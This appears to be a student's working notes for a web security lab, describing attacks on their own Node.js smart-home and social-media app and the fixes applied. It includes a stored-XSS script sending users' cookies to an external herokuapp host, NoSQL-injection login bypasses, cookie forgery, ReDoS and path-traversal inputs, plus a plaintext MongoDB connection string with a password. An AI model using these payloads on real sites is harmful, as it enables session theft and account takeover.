@@ -1,0 +1,472 @@
+response.write(fileData); to write a file (maybe html)?
+
+response.writeHead(200, { 'Content-Type': 'text/plain',
+                          'Trailer': 'Content-MD5' });
+                          
+          serve static content                https://nodejs.org/en/knowledge/HTTP/servers/how-to-serve-static-files/ 
+          
+          
+		
+
+Aufgabe 1:
+-Exercise 1: Hello World  DONE	
+-Serving content fast DONE
+-Exercise 2: a static web server	soweit done
+-Exercise 3: experimenting with request methods DONE 
+-Exercise 4: content generation DONE
+-DOS
+________________________________________________________________________________________________________________________________________________________________________________________________
+Aufgabe 2:
+-single page application mit überschrift @home, 3 Spalten der Räume mit gradzahl daneben in grau, jew. darunter button für versch. lichter mit versch. farben, based on state
+-load information from server about lights etc. regularly
+-routing and applicationpaths
+	-wie mache ich routingtabellen
+	-main page wird aus template generiert und nimmt die aktuellen werte. path /
+	- AJAX GET requests to /:room/lights/:light oder /:room/temperature
+		-response json encoded sensor state
+	-for switch client sends AJAX POST requests to /:room/lights/:light e.g.
+	-wie mache ich ne routing table?
+	-alle routen eintragen
+	-bei get nen json mit model zurücksenden
+	-bei post anpassen des data models und zurücksenden des neuen status
+	-routing table über switch case weiterhin (evtl. nested)
+	-datamodel als variable oder javascript objekt
+	-route parameters named? params property von request object?, named url segments?
+-the client
+	-evtl. mit jquery statt xmlhttprequest nutzen nachdem fertig
+	-function die identifier der button empfängt und dann anhand von tabellen entscheidet welche get bzw. post anfragen sendet(nach post wir trotzem update zurückgesendet
+
+_________________________________________________________________________________________________________________________________________________________________________________________________	
+Submission 3:
+-changed a few things to keep submission2 workable.old "/" paht is now "/submission2"
+-made users like in the example with pw "12345678" and the stand user with username: daniel, pw: fisksoppa from the previous submission.
+______________________________________________________________________________________________________________________________________________
+Submission 4:
+username:websecurity pw: fisksoppa
+
+
+const { MongoClient, ServerApiVersion } = require('mongodb');
+const uri = "mongodb+srv://websecurity:fisksoppa@websecurity.yyrpv.mongodb.net/myFirstDatabase?retryWrites=true&w=majority";
+const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });
+client.connect(err => {
+  const collection = client.db("test").collection("devices");
+  // perform actions on the collection object
+  client.close();
+});
+
+
+I orignally made my own cookie handlers and would have adaptem them to handle the db. But in order for you to better get my code, i just put in your functions like newSession() etc.
+
+d7724e70c10f21c6a729ac6730b633eae3a8d2994fb413fe5a14d4f5fdad106e32c7a9e678285cb817a49d68f20c8bd81f74ccbe86a3cf117df50cf59b09e257
+d7724e70c10f21c6a729ac6730b633eae3a8d2994fb413fe5a14d4f5fdad106aae32c7a9e678285cb817a49d68f20c8bd81f74ccbe86a3cf117df50cf59b09e257
+
+
+
+todo:
+when log out destroy csrf and cookie
+
+squeak-session=%7B%22sessionid%22%3A%22{"$gt": ""}%22%2C%22username%22%3A%7B%22%24gt%22%3A%22%22%7D%7D; Max-Age=1800; Path=/; Expires=Fri, 25 Mar 2022 15:30:34 GMT; HttpOnly; Secure; SameSite=Strict
+
+NoSQL injection
+I was able to bypass authentification by using the user and pw "{"$gt": ""}", sent it over a separate request to "https://localhost:8000/signin" got the session back and by that log in as the first user in the database, squeak and do everything.
+
+To hijack a session i analyzed the structure of the cookie and inserted the "{'$gt':''}" where the session id is normaly: "squeak-session=%7B%22sessionid%22%3A%22{"$gt":''}}%22%2C%22username%22%3A%22daniel%22%7D" for example. But no matter what i tried, the combination of my, cookie.parser and my session handler who interprets the cookie value as json made the neccessary object always to a string which prohibited it from getting the cookie.
+
+I was able to get the session when doing it directly in my code. but didnt find a way to make it work as a "client"
+
+The same was for the credetial of a special person: when used as username { $regex: 'daniel', $options: "si" } and as password {"$gt": ""} i was able to retrieve the credentials of this person. After getting through a rest client the according cookie i was able to read all messages from the perspective of this person.
+
+If i would use salt and hash this attacks wouldn't change because the expression is only used to find the username and pw in the db.
+In order to be more protected i have to check if the found username and userpw is the same, i provided.
+
+To make it work i would have to add functionality to rehash the given pw and compare it to the one in the db. This way the attack json "{"$gt": ""}" would be interpreted as a String and fail to access the db.
+
+datatype validators,Integer.parseInt() with exception, check if input 
+As a fix i made a middleware called "inputValidation". It mainly there for the username and password. I first start by checking agains a blacklist with unallowed sign which are often used for regex in order to prevent a regexdos. Then Im checking based on path different things. For example for "/signin" im checking the username against the usernames in the db.
+I also took a regexpression for valid usernames and check it for every username.
+For passwords im only checking that it hasnt some specific characters in order to prevent json and regex.
+
+Now im calling the middleware for signin and signup before somehting with the data even happens.
+
+As a bonus im only searching the username after encoding it.
+
+I tried to do the same attacks from before but the inputValidator could stop the request before something else happened.
+
+
+Cookie integrity attacks
+I made a new User "AttackerCookieIntegrity" and once I was logged in, i just changed the username in the cookie to  "%7B%22sessionid%22%3A%2213a0af4d3e0dd07b6d73d6b32b8b1615e5dfc0639eb00434331410ff9c58c5ea5fb547f21a597126588ab6fed576508e0c79d2bbfb53a3442c4bc42032d16608%22%2C%22username%22%3A%22A. Church%22%7D" and refreshed the Site. Now i am able to post as "A. Church" and read his private Messages.
+
+This is possible because we're checking for authentication but not authorization and everyone can tamper with the cookie without the server knowing.
+
+As a Countermeasure i used the cookie and cookieparser functionality of express which allowed me directly to sign the cookies and unsign them.
+I also change the sessionmiddleware to use the req.signedcookies and if its fals or undefined it directly throws an error and sends an 405 status.
+I can't tamper with the cookie anymore.
+
+_______________________________________________________________________________________________________________________
+
+Submission 5:
+CSP:
+What is it?:
+
+Whats important to protect against xss
+
+-default-src macht sinn als backup
+-script-src to prevent inline script
+-style-src
+
+For "My first web application" is called the url "http://localhost:8000/information?q=<script>alert('test');</script>" and the browse showed me the alert as expected.
+Because its a very Basic Website doing nothing besided getting css and js from origin and showing the parameter etc I added the following CSP:
+
+res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self';  style-src 'self'; frame-ancestors 'none'; form-action 'none';");  
+
+and it worked without problems. The script wasn't injected anymore.
+
+
+My first social media web application
+
+Mozilla doesnt allow some csp attributes and in order to get the protection through the csp i had to rewrite the template files.
+At first the signin and signup button scripts/buttons were blocked so i outsourced every inline function so this eventhandler worked but inserted xss wouldnt.
+In order to protect my form I also only allowed to send them to the "./squeak" address.
+
+I used the following CSP for the social media web application:
+res.setHeader(
+        'Report-To',
+        '{"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"https://localhost:8000/report"}],"include_subdomains":true}'
+    );
+
+res.setHeader("Content-Security-Policy", "default-src 'self' ; script-src 'self' ;  style-src 'self'; frame-ancestors 'none'; form-action https://localhost:8000/;report-uri https://localhost:8000/report;");
+
+After that I was able to use my application as intenden and XSS Attack were 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+___________________________________________________________________
+Stored XSS Atack:
+The first attack with "<script>alert('Owned');</script>" was pretty straightforward. I was able to place the script as a "Squeak" and every user who logged in ran the script.	
+
+
+To get the cookies I used the following squeak and "squeaked" it 
+"<script>
+var xhttp = new XMLHttpRequest();
+console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
+ xhttp.open("POST", "https://dva446.herokuapp.com/store/156", true);
+ var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
+ xhttp.send(username+":"+document.cookie);
+</script>"
+
+I tried to sign in with different users and their data were all sent to "https://dva446.herokuapp.com/store/156" and i could access it to see them.
+
+Countermeasures:
+settings the template engine up wasnt so difficult. But because i made the replacements in two steps: first replacing the values like name, card text etc. for every html snippet, combine them and then replace it in the template file. To simulate similar behaviour I used Mustache.render to render locally.
+Now everything was unescaped correctly.
+
+I also added the secure and httponly flags when i set cookies.
+
+CSRF Attack:
+First I analyzed how the "squeaking" is made by checking to which url, with whtat method and with which formdata are sent.
+url was: "https://localhost:8000/squeak"
+method was: "POST"
+and formdata was: "squeak:"csrf+test+to+check+how+the+request+is+made!"
+
+After that i used a simple html document place in the Public directory for convenience reasons and mad a small form which works with a hidden iframe.
+The value used for posting the squeak was "Click <a href='https://localhost:8000/csrfAttack.html'>here</a> to get the iPhobe X FREE!"
+
+Now i log in as "M. Schönfinkel" and "accidentaly" call "https://localhost:8000/csrfAttack.html". M. Schönfinkel posted the link (which is at least not directly clickable because of the escaping through mustache) and doesnt even know it, because the reload command was sent to the attacker website. He will only see it, once he refreshes the website.
+Next i signed in as "A. Church" and open the malicious link and posted it myself too.
+
+In order to protect against CSRF attacks i used sth. similiar to the "Double Submit Cookie" and set the cookies to samesite also.
+Every time "/" gets requested i send a knew encrypted csrfToken and set in the forms etc. the normal csrf cookie. This way i could prevent an csrf attack.
+
+As far as i understood csrf attacks are particularly dangerous when you can do things as an authenticated user like make bank transfers etc. Thats why I didnt protect the other endpoints. The damage is small.
+
+RegExp Denial of Service:
+i used as a username: "^(([a-z])+.)+[A-Z]([a-z])+$" and as a password "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" which resulted 
+in the server multiple minutes not beeing able to handle any request. But i couldnt take it offline.
+
+As a protection I encoded the username and check every symbol of the username against a blacklist with often used regex symbols.
+
+
+todo:
+972 error mit json.parse
+-post json to /squeak
+-delete session if exists?
+disabled button
+-squeak working mayber with render, 
+-old code to work
+-signup seems to work
+-pw file deleted
+-serverseitig json senden mit type json usw
+{"sessionid":"c8a17f8228608dfceea391a23bcc1870","username":"A. Church "}
+%7B%22sessionid%22%3A123%2C%22username%22%3A%22A.%20Church%20%22%7D
+-schauen warum js nicht ganz geladen wird bzw. header nicht setzbar
+	=>weil weil es vorher abgefangen wurde und jetzt wird der express.static einen großteil übernehmen
+-datacontroller und filedata are the same	
+
+protect logout?
+-iwie klappt das neuladen nicht nachdem logout.vielleicht weil es kein formobject o.ä. ist
+
+
+-mayber ajax (https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
+-js object for valid cookies
+	-evtl. cookie handler
+	
+-pw handler der checkt ob pw existiert bzw. falsch ist
+	->erst file lesen dann JSON.parse
+-logout handler 
+	-logout option hinzufügen und auch in javascript onclickhandler eintragen
+-getCookieid handler
+-sammlung der gültigen cookies
+	
+für angriffe:
+-man kann viel bei cookies ausnutzen
+
+	
+
+
+__________________________________________________________________________________________________________________________
+
+known problems:
+
+
+mögliche problems:
+-url.parse nehmen um sicherheitslücke zu haben (siehe exercise 4)
+________________________________________________________________________________________________________________________________________________
+links:
+-what is json https://www.tutorialrepublic.com/javascript-tutorial/javascript-json-parsing.php
+-url decoder: https://meyerweb.com/eric/tools/dencoder/
+-regular expression for username: https://stackoverflow.com/questions/12018245/regular-expression-to-validate-username
+.object.values: https://developer.mozilla.org/de/docs/Web/JavaScript/Reference/Global_Objects/Object/values
+-json cookie reverse: https://wikimass.com/json/sort-reverse
+-append file: https://stackoverflow.com/questions/3459476/how-to-append-to-a-file-in-node
+-learn router in express: https://www.digitalocean.com/community/tutorials/learn-to-use-the-new-router-in-expressjs-4
+-express using middleware: https://expressjs.com/en/guide/using-middleware.html
+-nodejs crypto: https://nodejs.org/api/crypto.html#class-hmac
+-cookie parses npm: https://www.npmjs.com/package/cookie-parser
+-writing middleware in express: https://expressjs.com/en/guide/writing-middleware.html
+-server side forms validation: https://getbootstrap.com/docs/4.0/components/forms/#server-side
+-document.cookie: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+-xss prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+-mustache git: https://github.com/janl/mustache.js
+-mustache express: https://www.npmjs.com/package/mustache-express
+-good explanation: csrf
+-regex dos: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
+-http cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+-cookie npm: https://www.npmjs.com/package/cookie
+-express route tester: http://forbeslindesay.github.io/express-route-tester/
+-path to regexp: https://www.npmjs.com/package/path-to-regexp
+-express and node: https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/Introduction#creating_route_handlers
+-express route and controllers: https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes
+-csrf cheat sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern
+-smart strings: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
+-datetime manipulation: https://www.toptal.com/software/definitive-guide-to-datetime-manipulation
+-js current date: https://www.programiz.com/javascript/examples/display-current-date
+-js named arguments https://blog.bitsrc.io/javascript-why-named-arguments-are-better-than-positional-arguments-9b15ab3155ef
+-named parameters
+-check for undefined: https://stackoverflow.com/questions/3390396/how-can-i-check-for-undefined-in-javascript
+-comprehensive list of node.js express response methods: https://stackoverflow.com/questions/7042340/error-cant-set-headers-after-they-are-sent-to-the-client
+-https server express https://medium.com/@nitinpatel_20236/how-to-create-an-https-server-on-localhost-using-express-366435d61f28
+-passing variables to express middleware https://stackoverflow.com/questions/18875292/passing-variables-to-the-next-middleware-using-next-in-express-js
+-https://melvingeorge.me/blog/check-if-path-is-directory-nodejs : path is a directory?
+-https://nodejs.dev/learn/nodejs-file-paths could be nice for checking out the file endings
+-https://stackoverflow.com/questions/52908212/how-to-serve-static-files-in-vanilla-nodejs/52913289
+-https://www.w3schools.com/js/js_string_methods.asp
+-html table https://www.w3schools.com/html/html_tables.asp
+-replace string https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace
+-string in list? https://stackoverflow.com/questions/2430000/determine-if-string-is-in-list-in-javascript
+-file extension https://attacomsian.com/blog/nodejs-get-file-extension
+-null check https://stackoverflow.com/questions/2422946/javascript-check-for-not-null/34817844
+-xss overview https://owasp.org/www-community/attacks/xss/
+-grep suchen https://praxistipps.chip.de/unter-linux-nach-text-in-dateien-suchen-so-gehts_28711
+-switch case https://developer.mozilla.org/de/docs/Web/JavaScript/Reference/Statements/switch
+-xss video https://www.youtube.com/watch?v=dFci82qwXA0
+-types of xss https://owasp.org/www-community/Types_of_Cross-Site_Scripting
+-cross site scripting prevention https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules
+-testing for xss https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html
+-dom based xss prevention sheet https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+-denial of service https://owasp.org/www-community/attacks/Denial_of_Service
+-query string nodejs https://stackoverflow.com/questions/6912584/how-to-get-get-query-string-variables-in-express-js-on-node-js?rq=1
+-Object keys: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys
+-strings in js https://developer.mozilla.org/en-US/docs/Learn/JavaScript/First_steps/Strings
+-bootstrap badges https://getbootstrap.com/docs/4.1/components/badge/
+-ajax beispiel : https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX/Getting_Started
+-url parts https://css-tricks.com/snippets/javascript/get-url-and-url-parts-in-javascript/
+-javascript function als string https://www.sitepoint.com/call-javascript-function-string-without-using-eval/
+-storage inspector https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector
+-bootstrap button https://getbootstrap.com/docs/4.1/components/buttons/
+-nodejs redirect https://www.tutorialkart.com/nodejs/node-js-redirect-url/
+-nodejs hmac crypto https://stackoverflow.com/questions/20004530/node-js-hmac-sha256-base64-of-string
+-js variable property by name https://stackoverflow.com/questions/4255472/javascript-object-access-variable-property-by-name-as-string
+-js https://stackoverflow.com/questions/6084858/javascript-use-variable-as-object-name
+-buffer tostring https://masteringjs.io/tutorials/node/buffer-to-string
+-url and parts in js https://css-tricks.com/snippets/javascript/get-url-and-url-parts-in-javascript/
+-encode uri https://www.w3schools.com/jsref/jsref_encodeuri.asp
+-js remove item from array: https://stackoverflow.com/questions/5767325/how-can-i-remove-a-specific-item-from-an-array
+-nodejs learn :https://nodejs.dev/learn/nodejs-file-paths
+-json overview https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON
+-working with json https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/JSON
+-json stringify https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify
+-bootstrap buttons : https://getbootstrap.com/docs/4.1/components/buttons/
+-user authentication video: https://www.youtube.com/watch?v=MT7X17ZRo1U
+-article on authentication authorization: https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512578(v=technet.10)
+-storage inspector https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector
+-types of attack session fixation etc https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation
+-npm cookie package: https://www.npmjs.com/package/cookie
+-document.cookie: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+-document.getelementbyid: https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById
+-package lock: https://docs.npmjs.com/cli/v8/configuring-npm/package-lock-json
+-path traversal: https://owasp.org/www-community/attacks/Path_Traversal
+-path traversal owasp: https://wiki.owasp.org/index.php/Path_Traversal
+-password security: https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/
+-string normalize: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/normalize
+-buffer class: https://nodejs.org/api/buffer.html#class-buffer
+-session management cheat sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-properties
+-crypto nodejs api: https://nodejs.org/api/crypto.html#using-strings-as-inputs-to-cryptographic-apis
+-ajax get json: https://www.w3schools.com/jquery/ajax_getjson.asp
+-jquery getjson: https://api.jquery.com/jquery.getjson/
+-key exists in js object: https://stackoverflow.com/questions/1098040/checking-if-a-key-exists-in-a-javascript-object
+-convert string buffer: https://melvingeorge.me/blog/convert-string-buffer-nodejs
+-common jscript problems https://developer.mozilla.org/en-US/docs/Learn/Tools_and_testing/Cross_browser_testing/JavaScript
+-location reload: https://developer.mozilla.org/en-US/docs/Web/API/Location/reload
+-substring replace: https://stackoverflow.com/questions/16702357/how-to-replace-a-substring-of-a-string
+-debugging getting started nodejs https://nodejs.org/en/docs/guides/debugging-getting-started/
+-javasript function as name: https://www.inflectra.com/support/knowledgebase/kb242.aspx
+-set cookie https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
+-cookies https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies	
+-js pass by value https://www.javascripttutorial.net/javascript-pass-by-value/							
+
+morgen:
+-auf /information ohne query zugreifen
+-at first i tried randomized a lot of long password or parameters
+___________________________________________________________________________________
+
+Stealing the password file:
+
+I started by directly putting "https://localhost:8000/passwd.json" into the search bar and got the input of the passwd file.
+Something like "https://localhost:8000/..%c0%af" didnt work because an uri malformed error was thrown.
+
+All unknown files etc. are handled by my "staticserverrHandler". There I use the URL functionalities which dont accept the encoded or double encoded versions of ".." etc.
+As the main protection i added a function which checks the allowed files and its endings. If its not an allowed fileending i just send back an 404 error.
+
+I tried also "https://localhost:8000/passwd.json%00.js" to trick the filesystem into thinking its an allowed fileending but this lead to no success.
+
+I made an extra function and encrypted the pw with pbkdf2Sync and the salt with randombytes(16) from the crypto functions. I saved the encrypted pw, salt and iterations (100.000) in my passwordfile.
+
+Temporarily i had a problem that my css etc. files werent loaded, probably because of some problems with the scope. I fixed it by saving the needed variable specifically.
+
+___________________________________________________________________________________________________________
+Session hijacking:
+I performed the attack exactly like written using chrome and firefox. After generating the correctly "guessed" cookie i was able to connect to the smart home part of the website without any problems.
+
+I thought about changing the cookie name but decided to keep it because of the assignment description.
+By modifying my cookieHandler function and using randombytes(16) i sufficed the recommended session id length. The rest of the handler works basically still the same.
+
+The maxAge of the new Cookies is 30 minutes and every time when the cookies were not in the valid list or when we destroyed the cookies we also sent an invalidation to the client via a negative max age and no value.
+To be sure on the server side i changed my datastructure and saved the cookieid and the timestamp accordingly. The setIntervall method helped me to regularly check if something needds to be deleted. That how i keept my active sessions in order.
+
+As a bonus i check on the client side for the success of the xhr.If it fails and the cookie was invalidated (for example because its no valid cookie) i refresh the Page which mostly lead to a redirect to the loginpage.
+
+todo: password protection noch machen, session hijacking
+
+_____________________________________________________________________________________________________________________________________
+DOS attack
+i read about dos attacks and thought of the different possiblities my code could be attackable.
+-i might not thougt of every case to check for file existence or allowed filetypes. especially with the newly added routing function
+-if i take a very long pathname or send a lot of parameters i could maybe also slow down the server if long enough
+-test if i specify more than just /information as path if it is possible to generate weird behaviour
+-my route function splits the path. maybe if the path is long enough it can slow down the server
+-i make an array for all query parameter which could be too big
+- i show all query parameter in the website which could be problematic if too big
+-the website waites for body data. what happens if the body data is to big
+- count keys of object https://stackoverflow.com/questions/126100/how-to-efficiently-count-the-number-of-keys-properties-of-an-object-in-javascrip
+
+_________________________________________________________________________________________________________________________________________________________
+first attacks:
+-i found out through my locks that i didnt thought of the ending .ico and its not loaded because of that
+-i generated random pairs of parameters and send them to localhost:8000/information?ab=ac etc. Started with 10 pairs and multiplied everytime times 10. Til about 10000. There i found out that the browser seems to cut the parameters at some point. I managed to send about 567 parameter pairs. but it doesnt crash the server.
+-next i tried to pass very long paths.this also results in no crash because for example in the /information path i dont care for the other paths. the only thing what happened was, that css etc. were not loaded because the path doesnt exist. the path was also cutted by the browser at some point
+-the next i tried is to send very long passwords via the post exercise 3. I saw, that that if i put in the path "Public" it seeks for the index.html it works but after sending it to the server it is send to "/index.html" which doesnt exist without the "/Public" before. I fixed it by checking if the file is a css,js or html and add an "/Public" in the path if there is none.i tried passwords up to 6000000 length and the server worked. only copy pasting was very slow at longer passwords.
+-through luck i found out that if i search for "localhost:8000/information" without the parameter the server crashes, becauce the the query object is null and i try to run a function on it. i fixed it by running a null check before.
+-i could also crash the server with "localhost:8000//" because that is an invalid url. I fixed it by catching the errors and return 404 answers.
+
+________________________________________________________________________________________________________________________________________________________________
+XSS Attack
+-I inserted the script "<script>alert('Owned');</script>" as a get parameter in "localhost:8000/inormation?search=nothing <script>alert('Owned');</script>" and the alert appeared.
+- i checked rule 0 and the only place im inserting the "untrusted" data is inside <td> elements. For rule 1 and 2 i made an specific function to encode data for the possiblities to do my own modifications in the future if neccessary. I encode explicitly all keys and values of the get parameter.
+
+
+________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+other stuff:
+-acces other stuff über path
+
+ <div class="card mb-2">
+            <div class="card-header">
+                M. Schönfinkel
+                <span class="float-right">Thu 10:42</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">Click &lt;a href&#x3D;&#x27;&#x27;&gt;here&lt;/a&gt; to get the iPhobe X FREE!</p>
+            </div>
+        </div>
+
+        <div class="card mb-2">
+            <div class="card-header">
+                A. Church
+                <span class="float-right">Tue 11:04</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">Do you like lambda calculus?</p>
+            </div>
+        </div>
+
+        <div class="card mb-2">
+            <div class="card-header">
+                H. Curry
+                <span class="float-right">Tue 10:52</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">There is a strong connection between lambda calculus and logic!</p>
+            </div>
+        </div>
+
+        <div class="card mb-2">
+            <div class="card-header">
+                M. Schönfinkel
+                <span class="float-right">Tue 10:49</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">It suffices with the S and K combinators!</p>
+            </div>
+        </div>
+
+
